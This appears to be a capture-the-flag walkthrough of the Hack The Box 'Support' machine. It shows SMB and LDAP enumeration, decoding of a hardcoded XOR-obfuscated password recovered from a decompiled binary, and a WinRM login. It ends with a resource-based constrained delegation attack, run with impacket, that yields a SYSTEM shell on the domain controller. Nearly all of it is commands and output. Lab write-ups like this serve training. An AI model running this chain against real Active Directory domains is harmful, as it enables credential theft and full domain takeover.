
Initial enumeration :

```
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ nmap -sV -sC -Pn 10.129.105.81
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 22:14 +0530
Nmap scan report for 10.129.105.81
Host is up (0.43s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-12 16:50:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-12T16:50:41
|_  start_date: N/A
|_clock-skew: 4m48s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.35 seconds
```

```
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ smbclient -L \\\\10.129.105.81\\
Password for [WORKGROUP\mithun]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.105.81 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


Next we get into the SMB shell :

```
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ smbclient \\\\10.129.105.125\\support-tools
Password for [WORKGROUP\mithun]:
Try "help" to get a list of possible commands.
smb: \> l
  .                                   D        0  Wed Jul 20 22:31:06 2022
  ..                                  D        0  Sat May 28 16:48:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 16:49:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 16:49:55 2022
  putty.exe                           A  1273576  Sat May 28 16:50:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 16:49:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 22:31:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 16:50:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 16:49:43 2022

		4026367 blocks of size 4096. 968266 blocks available
smb: \> ls
  .                                   D        0  Wed Jul 20 22:31:06 2022
  ..                                  D        0  Sat May 28 16:48:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 16:49:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 16:49:55 2022
  putty.exe                           A  1273576  Sat May 28 16:50:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 16:49:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 22:31:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 16:50:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 16:49:43 2022

		4026367 blocks of size 4096. 968266 blocks available
```


and then download the userinfo.exe.zip into the kali shell , through the get  UserInfo.exe.zip

and then the file extension is .exe we need to decompile through the ilspy  and open the file in the ilspy application

In the userinfo --> protected-->enc_passwrod and get_password

```
using System;
using System.Text;

internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}

private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

We have found that password for the ldapQuery but somehave it got encrypt using the Xor , we  need to reverse it 

```
import base64

enc = '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
key = b'armando'

arr = base64.b64decode(enc)
result = bytes([arr[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(arr))])
print(result.decode())


python3 file.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

```

we found that password for the LdapQuery() , and we need to connect to the LdapQuery() 

```
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | tee ldapsearch.log
# extended LDIF
#
# LDAPv3
# base <CN=Users,DC=support,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# Users, support.htb
dn: CN=Users,DC=support,DC=htb
objectClass: top
objectClass: container
cn: Users
description: Default container for upgraded user accounts
distinguishedName: CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528110155.0Z
whenChanged: 20220528110155.0Z
uSNCreated: 5660
uSNChanged: 5660
showInAdvancedViewOnly: FALSE
name: Users
objectGUID:: fvT3rPs5nUaComz/MQQwrw==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=support,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20220528110344.0Z
dSCorePropagationData: 16010101000001.0Z



but in the info it shows that passord of the support/support
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | tee ldapsearch.log | grep info
 298939 for more information.
info: Ironside47pleasure40Watchful
                                     
```

we found the password for the support/suport user with the password : Ironside47pleasure40Watchful

and we need to connect to the Support/support with that password 

```
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ evil-winrm -i 10.129.105.125 -u support -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> type c:\Users\support\Desktop\user.txt
40f1b1184595fe2129d6c3f180c774e9

```

**Privilege - Escalation :**

```
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADDomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=support,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
DistinguishedName                  : DC=support,DC=htb
DNSRoot                            : support.htb
DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
Forest                             : support.htb
InfrastructureMaster               : dc.support.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
ManagedBy                          :
Name                               : support
NetBIOSName                        : SUPPORT
ObjectClass                        : domainDNS
ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
ParentDomain                       :
PDCEmulator                        : dc.support.htb
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {dc.support.htb}
RIDMaster                          : dc.support.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
SystemsContainer                   : CN=System,DC=support,DC=htb
UsersContainer                     : CN=Users,DC=support,DC=htb
```

```
*Evil-WinRM* PS C:\Users\support\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

```

On scanning the Bloodhood , we know that generic all privilege has been set , so that we can control the Domain Controller ( DC ) and the privilege escalation is that we need to add the user and got the ticker through the kerberous attack and then we added that user is administrator and we obtain the shell , and got the root-flag

```
──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' -computer-name 'FAKE$' -computer-pass 'Password123!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account FAKE$ with password Password123!.
                                                                                                                                                                                                                                              
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' -delegate-from 'FAKE$' -delegate-to 'dc$' -action write
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKE$ can now impersonate users on dc$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKE$        (S-1-5-21-1677581083-3380853377-188903654-6101)
                                                                                                                                                                                                                                              
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ impacket-getST support.htb/FAKE$:'Password123!' -spn cifs/dc.support.htb -impersonate administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
                                                                              
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
                                                                                                                                                                                                                                              
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ impacket-smbexec -k -no-pass administrator@dc.support.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>find / root 2>/dev/null
[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
                                                                                                                                                                                                                                              
┌──(mithun㉿kali)-[~/…/htb/machines/Windows/Support]
└─$ impacket-smbexec -k -no-pass administrator@dc.support.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>type c:\Users\Administrator\Desktop\root.txt
6a59bb20091432da15ce91e6fb65e7b6

C:\Windows\system32>
                                                                              
```


